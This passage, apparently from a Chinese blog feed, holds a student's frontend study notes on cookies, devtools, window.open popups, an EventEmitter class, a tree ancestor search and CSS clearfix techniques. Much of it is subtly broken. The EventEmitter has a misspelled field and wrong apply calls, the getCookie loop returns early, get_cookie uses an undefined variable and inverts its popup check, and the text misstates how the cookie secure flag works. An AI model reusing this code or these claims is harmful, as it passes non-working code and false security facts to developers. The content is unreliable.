class="code"><pre><span class="line">document.cookie=&quot;name=中文&quot;;</span><br><span class="line">//为了防止中文乱码，我们可以使用encodeURIComponent()编码；decodeURIComponent()解码</span><br><span class="line">document.cookie = encodeURIComponent(&quot;name&quot;)+&quot;=&quot;+encodeURIComponent(&quot;中文&quot;);</span><br></pre></td></tr></table></figure><ol start="2"><li>expires=evalue 可选参数</li></ol><p>该对象的有效时间（可选）只支持GTM 标准时间，即要将时间转换，toUTCString()（默认为当前浏览器 会话有用，关闭浏览器就消失）;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var date = new Date(); 　</span><br><span class="line">date.setTime(date.getTime()+2000);//获取当前时间并加上 2 秒钟 　</span><br><span class="line">alert(date.toUTCString());//格林威治时间 (GMT) 把 Date 对象转换为字符串，并返回结果</span><br><span class="line">alert(date.toGMTString());//与上面的结果一样，但是这个方法已经被上面取代了 </span><br><span class="line">document.cookie=&quot;name=vae;expires=&quot;+date.toUTCString(); </span><br><span class="line">alert(document.cookie); // name=vae 　</span><br><span class="line">setTimeout(function()&#123;alert(document.cookie)&#125;,4000);//4 秒后打印空的字符串</span><br></pre></td></tr></table></figure><ol start="3"><li>path=pvalue 可选参数</li></ol><p><strong>限制访问 cookie 的目录，默认情况下对于当前网页所在的同一目录下的所有页面有效</strong></p><ol start="4"><li>domain=dvalue 可选参数</li></ol><p><strong>用于限制只有设置了的域名才可以访问；如果没有设置，则默认在当前域名访问</strong><br>比如设置 test.com 表示域名为test.com的服务器共享该Cookie</p><ol start="5"><li>secure=true|false 可选参数，默认是 true 不安全传输</li></ol><p>安全设置，<font color="#FF8C00">指明必须通过 安全的通信通道来传输（https) 才能获得 cookie,true 不安全，默认值；false 安 全，必须通过 https 来访问</font><br>比如：如果你设置 document.cookie = “name=vae;secure”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">　　　　　　　//设置 cookie</span><br><span class="line">function setCookie(objName, objValue, objHours)&#123;//添加cookie</span><br><span class="line">    var str = objName + &quot;=&quot; + encodeURIComponent(objValue);</span><br><span class="line">    if (objHours &gt; 0) &#123;//为0时不设定过期时间，浏览器关闭时cookie自动消失</span><br><span class="line">        var date = new Date();</span><br><span class="line">        var ms = objHours * 3600 * 1000;</span><br><span class="line">        date.setTime(date.getTime() + ms);</span><br><span class="line">        str += &quot;; expires=&quot; + date.toUTCString();</span><br><span class="line">    &#125;</span><br><span class="line">    document.cookie = str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//获取 cookie</span><br><span class="line">function getCookie(objName)&#123;//获取指定名称的cookie的值</span><br><span class="line">    //多个cookie 保存的时候是以 ;空格  分开的</span><br><span class="line">    var arrStr = document.cookie.split(&quot;; &quot;);</span><br><span class="line">    for (var i = 0; i &lt; arrStr.length; i++) &#123;</span><br><span class="line">        var temp = arrStr[i].split(&quot;=&quot;);</span><br><span class="line">        if (temp[0] == objName)&#123;</span><br><span class="line">            return decodeURIComponent(temp[1]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//为了删除指定名称的cookie，可以将其过期时间设定为一个过去的时间</span><br><span class="line">function delCookie(name)&#123;</span><br><span class="line">    var date = new Date();</span><br><span class="line">    date.setTime(date.getTime() - 10000);</span><br><span class="line">    document.cookie = name + &quot;=a; expires=&quot; + date.toUTCString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong><br>（1）cookie可能被禁用。当用户非常注重个人隐私保护时，他很可能禁用浏览器的cookie功能；<br>（2）cookie是与浏览器相关的。这意味着即使访问的是同一个页面，<font color="#FF8C00">不同浏览器之间所保存的cookie也是不能互相访问的</font>；<br>（3）cookie可能被删除。因为<font color="#FF8C00">每个cookie都是硬盘上的一个文件</font>，因此很有可能被用户删除；<br>（4）cookie安全性不够高。所有的cookie都是以纯文本的形式记录于文件中，因此如果要保存用户名密码等信息时，最好事先经过加密处理。<br>（5）cookie 在保存时，只要后面保存的 name 相同，那么就会<font color="#FF8C00">覆盖</font>前面的 cookie，注意是完全覆盖，包括失效时间，pat</p><h1 id="cookie-禁用"><a href="#cookie-禁用" class="headerlink" title="cookie 禁用"></a>cookie 禁用</h1><p><strong>sessionID通过cookie保存在客户端，如果将cookie禁用，必将对session的使用造成一定的影响。</strong></p><p><strong>解决这个问题的办法是：<font color="#FF8C00">URL重写</font></strong></p><p><strong>URL重写</strong> [TODO]</p><ol><li>servlet中涉及向客户端输出页面元素的时候，可以在相应的请求地址外面包上一层方法，也就是说使用response.encodeURL(“请求地址”);为请求地址添加一个JSESSIONID的值</li><li>servlet中涉及跳转到新的页面时，可以使用response.encodeRedirectURL(“请求地址”);为请求地址添加一个JSESSIONID的值</li></ol><h1 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h1><h2 id="谷歌浏览器自带的调试工具"><a href="#谷歌浏览器自带的调试工具" class="headerlink" title="谷歌浏览器自带的调试工具"></a>谷歌浏览器自带的调试工具</h2><ol><li>Elements：可查看网页页面代码（修改只是当前使用有效），也可实时调试修改页面ccs代码样式。</li><li>console：记录开发者开发过程中的日志信息，也可在里面写js代码。一般页面运行时js报错都是可以在这里看到反馈和定位bug原因及其位置。</li><li>Sources：断点调试JS，可以查看程序代码执行的过程，断点调试对于每一个程序员来说可是很重要。</li><li>Network：从发起网页页面请求开始，分析HTTP请求后得到的各个请求资源信息（“小编有时候就利用这下载一些网站不给下载的在线视频，比如教学视频”）。</li><li>Timeline：记录并分析网站的生命周期所发生的各类事件，分析渲染js执行的每一个阶段。</li><li>Application：记录网站加载的各个资源信息。</li><li>Security：判断网页是否安全。</li><li>Audits：对当前网页的网络利用及网页性能进行检测，并给出一些优化建议。</li></ol><h2 id="Sentry"><a href="#Sentry" class="headerlink" title="Sentry"></a>Sentry</h2><p>地址：<a href="https://sentry.io/welcome/">https://sentry.io/welcome/</a></p><p>无论测试如何完善的程序，bug总是免不了会存在的，有些bug不是每次都会出现，测试时运行好好的代码可能在某个用户使用时就歇菜了，可是当程序在用户面前崩溃时，你是看不到错误的，当然你会说:”Hey, 我有记日志呢”。 但是说实话，程序每天每时都在产生大量的日志，而且分布在各个服务器上，并且如果你有多个服务在维护的话，日志的数量之多你是看不过来的吧。等到某天某个用户实在受不了了，打电话来咆哮的时候，你再去找日志你又会发现日志其实没什么用：缺少上下文，不知道用户什么操作导致的异常，异常太多（从不看日志的缘故）不知如何下手 等等。</p><p>Sentry就是来帮我们解决这个问题的，它是是一个实时事件日志记录和聚合平台。它专门用于监视错误和提取执行适当的事后操作所需的所有信息, 而无需使用标准用户反馈循环的任何麻烦。</p><p>Sentry是一个日志平台, 它分为客户端和服务端，客户端(目前客户端有Python, PHP,C#, Ruby等多种语言)就嵌入在你的应用程序中间，程序出现异常就向服务端发送消息，服务端将消息记录到数据库中并提供一个web节目方便查看。Sentry 由 python 编写，源码开放，性能卓越，易于扩展，目前著名的用户有Disqus, Path, mozilla, Pinterest等。</p><h2 id="BrowserStack"><a href="#BrowserStack" class="headerlink" title="BrowserStack"></a>BrowserStack</h2><p>地址：<a href="https://www.browserstack.com/">https://www.browserstack.com/</a></p><p>现在拥有各自内核的浏览器越来越多，各自的特性也千差万别。如果作为一个前端攻城师想要检测网站在不同的操作系统和移动平台下的各种浏览器的兼容性，那是相当痛苦不堪的。看到有在自己电脑上装虚拟机配置各种环境，有自己的电脑上组建好这样的环境，然后一一测试，可是人的精力毕竟有限，我们没法在同一台电脑上装那么多系统，那么多浏览器的。幸好出了个 BrowserStack 是前端的福音呀。</p><p>BrowserStack 是一款提供网站浏览器兼容性测试的在线云端测试工具，从而开发测试人员不必再准备很多虚拟机或者手机模拟器。</p><p>BrowserStack 是一个提供网站浏览器兼容性测试的在线云端应用，支持9大操作系统上的100多款浏览器。支持本地测试，支持与Visual Studio集成。或者你也可以直接前往 <a href="http://modern.ie/">http://modern.ie</a> 在线测试，现在注册可以免费试用三个月，三个月后是收费的，三个月后要是你想用又不想付费作为天朝的开发者你懂得。</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webAPI(第十三天)</title>
      <link href="/2022/08/09/webAPI(%E7%AC%AC%E5%8D%81%E4%B8%89%E5%A4%A9)/"/>
      <url>/2022/08/09/webAPI(%E7%AC%AC%E5%8D%81%E4%B8%89%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h1><p><strong>这个方法是用来打开新窗口的</strong></p><ol><li>最基本的弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;page.html&#x27;);</span><br></pre></td></tr></table></figure><ol start="2"><li>经过设置后的弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;page.html&#x27;, &#x27;newwindow&#x27;, &#x27;height=100, width=400, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&#x27;)   </span><br><span class="line">  //该句写成一行代码</span><br><span class="line">  //参数解释：</span><br><span class="line">  // window.open 弹出新窗口的命令； </span><br><span class="line">　　//&#x27;page.html&#x27; 弹出窗口的文件名； </span><br><span class="line">　　//&#x27;newwindow&#x27; 弹出窗口的名字（不是文件名），非必须，可用空&#x27;&#x27;代替； </span><br><span class="line">　　//height=100 窗口高度； </span><br><span class="line">　　//width=400 窗口宽度； </span><br><span class="line">　　//top=0 窗口距离屏幕上方的象素值； </span><br><span class="line">　　//left=0 窗口距离屏幕左侧的象素值； </span><br><span class="line">　　//toolbar=no 是否显示工具栏，yes为显示； </span><br><span class="line">　　//menubar，scrollbars 表示菜单栏和滚动栏。 </span><br><span class="line">　　//resizable=no 是否允许改变窗口大小，yes为允许； </span><br><span class="line">　　//location=no 是否显示地址栏，yes为允许； </span><br><span class="line">　　//status=no 是否显示状态栏内的信息（通常是文件已经打开），yes为允许</span><br></pre></td></tr></table></figure><ol start="3"><li>用函数控制弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">　　&lt;head&gt; </span><br><span class="line">　　&lt;script LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　&lt;!-- </span><br><span class="line">　　function openwin() &#123; </span><br><span class="line">　　window.open (&quot;page.html&quot;, &quot;newwindow&quot;, &quot;height=100, width=400, toolbar =no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&quot;) //写成一行</span><br><span class="line">　　&#125; </span><br><span class="line">　　//--&gt; </span><br><span class="line">　　&lt;/script&gt; </span><br><span class="line">　　&lt;/head&gt; </span><br><span class="line">　　&lt;body οnlοad=&quot;openwin()&quot;&gt; </span><br><span class="line">　　任意的页面内容... </span><br><span class="line">　　&lt;/body&gt; </span><br><span class="line">　　&lt;/html&gt; </span><br></pre></td></tr></table></figure><p><strong>解释：</strong> 这里定义了一个函数openwin(), 函数内容就是打开一个窗口。在调用它之前没有任何用途。怎么调用呢？ 方法一：&lt;body οnlοad=”openwin()”&gt; 浏览器读页面时弹出窗口； 方法二：&lt;body οnunlοad=”openwin()”&gt; 浏览器离开页面时弹出窗口； 方法三：用一个连接调用： &lt;a href=”#” οnclick=”openwin()”&gt; 打开一个窗口 注意：使用的”#”是<font color="#FF00FF">虚连接。</font> 方法四：用一个按扭调用： &lt;input type=”button” οnclick=”openwin()” value=”打开窗口” /&gt;</p><ol start="4"><li>弹出两个窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　&lt;!-- </span><br><span class="line">　　function openwin() &#123; </span><br><span class="line">　　window.open (&quot;page.html&quot;, &quot;newwindow&quot;, &quot;height=100, width=100, top=0, left=0,toolbar=no, menubar=no, scrollbars=no, resizable=no, location=n o, status=no&quot;)//写成一行 </span><br><span class="line">　　window.open (&quot;page2.html&quot;, &quot;newwindow2&quot;, &quot;height=100, width=100, top=100, left=100,toolbar=no, menubar=no, scrollbars=no, resizable=no, loca tion=no, status=no&quot;)//写成一行 </span><br><span class="line">　　&#125; </span><br><span class="line">　　//--&gt; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>为<strong>避免弹出的2个窗口覆盖</strong>，用top和left控制一下弹出的位置不要相互覆盖即可。最后用上面的说过的四种方法调用即可。 <font color="#FF8C00">注意：2个窗口的name(newwindow与 newwindow2)不要相同，或者干脆全部为空。</font></p><ol start="5"><li>主窗口打开文件1.htm，同时弹出小窗口page.html</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function openwin()&#123;</span><br><span class="line">    window.open(&quot;page.html&quot;,&quot;&quot;,&quot;width=200,height=200&quot;) </span><br><span class="line">&#125;</span><br><span class="line">   //加入body区：</span><br><span class="line">&lt;a href=&quot;1.htm&quot; οnclick=&quot;openwin()&quot;&gt;open&lt;/a&gt;即可。</span><br></pre></td></tr></table></figure><ol start="6"><li>弹出的窗口之定时关闭控制</li></ol><p>将一小段代码加入弹出的页面（注意是加入page.html的HTML中，可不是主页面中，否则……），让它在10秒后自动关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function closeit()&#123;</span><br><span class="line">   setTimeout(&quot;self.close()&quot;, 10000)   //毫秒</span><br><span class="line">&#125;</span><br><span class="line">&lt;body οnlοad=&quot;closeit()&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="7"><li>在弹出窗口中加上一个关闭按扭</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;关闭&quot; οnclick=&quot;window.close()&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="8"><li>内包含的弹出窗口—一个页面两个窗口</li></ol><p>内包含的弹出窗口—一个页面两个窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">　　&lt;head&gt; </span><br><span class="line">　　&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　function openwin() </span><br><span class="line">　　&#123; </span><br><span class="line">　　OpenWindow=window.open(&quot;&quot;, &quot;newwin&quot;, &quot;height=250, width=250,toolbar=no ,scrollbars=&quot;+scroll+&quot;,menubar=no&quot;); </span><br><span class="line">　　//写成一行 </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;TITLE&gt;例子&lt;/TITLE&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;BODY BGCOLOR=#ffffff&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;h1&gt;Hello!&lt;/h1&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;New window opened!&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;/BODY&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;/HTML&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.close() </span><br><span class="line">　　&#125; </span><br><span class="line">　　&lt;/SCRIPT&gt; </span><br><span class="line">　　&lt;/head&gt; </span><br><span class="line">　　&lt;body&gt; </span><br><span class="line">　　&lt;a href=&quot;#&quot; οnclick=&quot;openwin()&quot;&gt;打开一个窗口&lt;/a&gt; </span><br><span class="line">　　&lt;input type=&quot;button&quot; οnclick=&quot;openwin()&quot; value=&quot;打开窗口&quot;&gt; </span><br><span class="line">　　&lt;/body&gt; </span><br><span class="line">　　&lt;/html&gt; </span><br></pre></td></tr></table></figure><ol start="9"><li>终极应用—弹出的窗口这Cookie控制</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> function openwin()&#123; </span><br><span class="line">　　window.open(&quot;page.html&quot;,&quot;&quot;,&quot;width=200,height=200&quot;) </span><br><span class="line"> &#125; </span><br><span class="line"> function get_cookie(Name)&#123;</span><br><span class="line">    var search=Name+&quot;=&quot;;</span><br><span class="line">    var returnvalue=&quot;&quot;;</span><br><span class="line">    if(document.cookie.length&gt;0)&#123;</span><br><span class="line">　　    if (offset != -1) &#123; </span><br><span class="line">　　      offset += search.length </span><br><span class="line">　　      end = document.cookie.indexOf(&quot;;&quot;, offset); </span><br><span class="line">　　      if (end == -1) </span><br><span class="line">　　       end = document.cookie.length; </span><br><span class="line">　　        returnvalue=unescape(document.cookie.substring(offset, end));</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return returnvalue;</span><br><span class="line"> &#125;</span><br><span class="line"> function ladpopup()&#123;</span><br><span class="line">    if(get_cookie(&#x27;popped=yes&#x27;))&#123;</span><br><span class="line">      openwin()</span><br><span class="line">      document.cookie=&quot;popped=yes&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现-Eventemitter-类，有on、emit、off-方法"><a href="#实现-Eventemitter-类，有on、emit、off-方法" class="headerlink" title="实现 Eventemitter 类，有on、emit、off 方法"></a>实现 Eventemitter 类，有on、emit、off 方法</h1><ol><li>on(event,fn)：监听event事件，事件触发时调用fn函数；</li><li>once(event,fn)：为指定事件注册一个单次监听器，单次监听器最多只触发一次，触发后立即解除监听器；</li><li>emit(event,arg1,arg2,arg3…)：触发event事件，并把参数arg1,arg2,arg3….传给事件处理函数；</li><li>off(event,fn)：停止监听某个事件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class EventEmitter &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this._envents = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(event, callback) &#123;</span><br><span class="line">    //监听event事件，触发时调用callback函数</span><br><span class="line">    let callbacks = this._events[event] || [];</span><br><span class="line">    callbacks.push(callback);</span><br><span class="line">    this._events[event] = callbacks;</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  off(event, callback) &#123;</span><br><span class="line">    //停止监听event事件</span><br><span class="line">    let callbacks = this._events[event];</span><br><span class="line">    this._events[event] =</span><br><span class="line">      callbacks &amp;&amp; callbacks.filter((fn) =&gt; fn !== callback);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  emit(...args) &#123;</span><br><span class="line">    //触发事件，并把参数传给事件的处理函数</span><br><span class="line">    const event = args[0];</span><br><span class="line">    const params = [].slice.call(args, 1);</span><br><span class="line">    const callbacks = this._events[event];</span><br><span class="line">    callbacks.forEach((fn) =&gt; fn.apply(this.params));</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  once(event, callback) &#123;</span><br><span class="line">    //为事件注册单次监听器</span><br><span class="line">    let wrapFanc = (...args) =&gt; &#123;</span><br><span class="line">      callback.apply(this.args);</span><br><span class="line">      this.off(event, wrapFanc);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.on(event, wrapFanc);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="查找给定的两个节点的第一个公共父节点"><a href="#查找给定的两个节点的第一个公共父节点" class="headerlink" title="查找给定的两个节点的第一个公共父节点"></a>查找给定的两个节点的第一个公共父节点</h1><p>递归循环树的节点，因二叉树不能重复的特性,当前节点为 p or q ，返回当前节点 父节点循环中，如果找到一个，则查找其他子树 其他子树没有找到另外一个，就证明当前节点为找到的子树是最近公共祖先 两个都找到了，对应当前节点是两个节点的父节点这种情况，则返回当前节点。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var lowestCommonAncestor = function(root, p, q) &#123;</span><br><span class="line">if (!root || root === p || root === q) return root</span><br><span class="line">    let left = lowestCommonAncestor(root.left, p, q)</span><br><span class="line">    let right = lowestCommonAncestor(root.right, p, q)</span><br><span class="line">    if (!left) return right</span><br><span class="line">    if (!right) return left</span><br><span class="line">    return root</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS属性(第十二天)</title>
      <link href="/2022/08/05/CSS%E5%B1%9E%E6%80%A7(%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%A4%A9)/"/>
      <url>/2022/08/05/CSS%E5%B1%9E%E6%80%A7(%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h1><p>清除浮动其实叫做闭合浮动更合适，因为是把浮动的元素圈起来，让父元素闭合出口和入口不让他们出来影响其他的元素。<br>在CSS中，clear属性用于清除浮动，其基本语法格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择器&#123;clear:属性值;&#125;</span><br><span class="line">/*属性值为left,清除左侧浮动的影响</span><br><span class="line">  属性值为right,清除右侧浮动的影响</span><br><span class="line">  属性值为both,同时清除左右两侧浮动的影响*/</span><br></pre></td></tr></table></figure><h2 id="额外标签法"><a href="#额外标签法" class="headerlink" title="额外标签法"></a>额外标签法</h2><ol><li>末尾标签法</li></ol><p>通过在浮动元素的末尾添加一个空的标签。这是W3C推荐的做法，虽然比较简单，但是添加了无意义的标 签，结构化比较差，所以不推荐使用。下面三种写法都适用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;</span><br><span class="line">2. .clear &#123; clear:both &#125;</span><br><span class="line">    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;</span><br><span class="line">3..clear&#123; clear:both &#125;</span><br><span class="line">    &lt;br class=&quot;clear&quot; /&gt;    &lt;!--也可以使用br等别的块级元素来清除浮动--&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>内部标签法，把div放进父盒子里，盒子会撑开，一般也不会用。</li></ol><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>给父级元素添加overflow样式方法。<br>代码比较简洁，可以通过触发BFC方式，但是<font color="#FF00FF">因为本身overflow的本质是溢出隐藏的效果</font>，所以有的时候也会有<font color="#FF00FF">一些问题存在，比如内容增多的时候不会自动换行导致内容被隐藏掉，无法显示出要溢出的元素</font>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.father &#123;</span><br><span class="line">        overflow: auto;  </span><br><span class="line">      /* 加上这句话，就可以清除浮动   overflow = hidden|auto|scroll 都可以实现*/</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="伪元素法（最常用）"><a href="#伪元素法（最常用）" class="headerlink" title="伪元素法（最常用）"></a>伪元素法（最常用）</h2><ol><li>使用after伪元素清除浮动</li></ol><p>after是在父元素中加一个盒子，这个元素是通过css添加上去的，符合闭合浮动思想，结构语义化正确。<br>父元素中加一个类名为clearfix 。但是这个方法IE6，7不识别，要进行兼容，使用zoom:1触发 hasLayout来清除浮动<br>代表网站：百度、淘宝、网易等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.clearfix:after&#123;</span><br><span class="line">    content:&quot;.&quot;;  /*尽量不要为空，一般写一个点*/</span><br><span class="line">    height:0;     /*盒子高度为0，看不见*/</span><br><span class="line">    display:block;    /*插入伪元素是行内元素，要转化为块级元素*/</span><br><span class="line">    visibility:hidden;      /*content有内容，将元素隐藏*/</span><br><span class="line">    clear:both;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.clearfix &#123;</span><br><span class="line">    *zoom: 1;   /*  *只有IE6,7识别 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>after伪元素空余字符法</li></ol><p>父元素中加一个类名为clearfix，也需要兼容IE6、7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.clearfix::after&#123;</span><br><span class="line">    content:&quot;\200B&quot;;   /* content:&#x27;\0200&#x27;; 也可以 */</span><br><span class="line">    display:block;</span><br><span class="line">    height:0;</span><br><span class="line">    clear:both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 